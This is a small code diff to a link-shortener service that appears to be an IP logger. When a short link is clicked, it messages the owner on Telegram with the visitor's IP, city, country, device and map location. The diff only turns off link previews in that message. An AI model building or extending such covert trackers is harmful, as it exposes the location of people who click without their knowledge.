@@ -70,6 +70,7 @@ export class LinkService {
           `По вашей ссылке прошли!\n🗺️ Место: \`${city}\`, \`${country}\` (IP = \`${apiIp}\`)\n📱💻 Устройство:\n\`${userAgent}\`\n🔗 Ссылка: ${process.env.HOST}/${shortId}`,
           {
             parse_mode: 'Markdown',
+            disable_web_page_preview: true,
           },
         );
         await this.bot.telegram.sendLocation(link.userId, latitude, longitude);
